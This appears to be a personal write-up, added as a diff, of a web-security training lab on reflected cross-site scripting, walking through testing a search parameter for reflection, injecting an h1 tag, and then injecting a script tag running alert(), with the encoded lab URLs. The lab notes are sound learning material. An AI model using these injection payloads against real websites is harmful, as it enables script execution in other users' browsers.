@@ -1,0 +1,21 @@
+Problem: Lab: Reflected XSS into HTML context with nothing encoded
+End result: execute JS in client side to alert a message
+
+Analysis:
+
+Step 1:
+navigate to: https://0a88006303201c8b8247560400e100a1.web-security-academy.net/
+find the search input and see if the input is getting reflected in the output
+check the URL https://0a88006303201c8b8247560400e100a1.web-security-academy.net/?search=test
+observation: the input string is reflected as such in the output
+
+Step 2:
+Check if html tags can be injected by searching for <h1>test</h1>
+observation: you should not that the search query reflected should be a inside a h1 tag
+https://0a88006303201c8b8247560400e100a1.web-security-academy.net/?search=%3Ch1%3Etest%3C%2Fh1%3E
+
+Step 3:
+with the search query add script tag to execute an alert()
+like test<script>alert(1)</script>
+https://0a88006303201c8b8247560400e100a1.web-security-academy.net/?search=test+%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E
+Observation: you have successfully excuted JS in the client side, this can be used to run dangerous scripts instead of just alert
